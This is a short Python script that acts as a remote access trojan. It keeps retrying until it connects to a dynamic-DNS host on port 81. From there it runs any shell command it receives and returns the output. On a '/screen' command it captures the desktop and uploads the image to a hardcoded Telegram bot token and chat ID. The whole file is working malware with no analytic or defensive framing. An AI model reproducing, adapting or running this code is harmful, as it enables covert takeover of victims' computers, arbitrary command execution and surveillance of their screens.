import socket
import sys
import time
import subprocess
import requests
import numpy as np
import cv2
import pyautogui

host = 'dimagamera.ddns.net'
port = 81
while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		break
	except:
		pass

while True:
	a = s.recv(1024)
	a = a.decode()
	if a == '/cmd':
		cmd = s.recv(1024)
		cmd = cmd.decode()
		cmd_process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
		cmd_process = cmd_process.stdout + cmd_process.stderr
		s.send(cmd_process)

	elif a == '/screen':
		try:
			image = pyautogui.screenshot()
			image = cv2.cvtColor(np.array(image),
						cv2.COLOR_RGB2BGR)
			cv2.imwrite("image1.png", image)
			photo = open(r"image1.png", 'rb')
			files = {'document': photo}
			requests.post("https://api.telegram.org/bot1656016658:AAGxJpjEaZ--T1eDc4wUc8GS3NXQ1fNcJ2w/sendDocument?chat_id=330710135", files=files)
			photo.close()

		except:
			pass
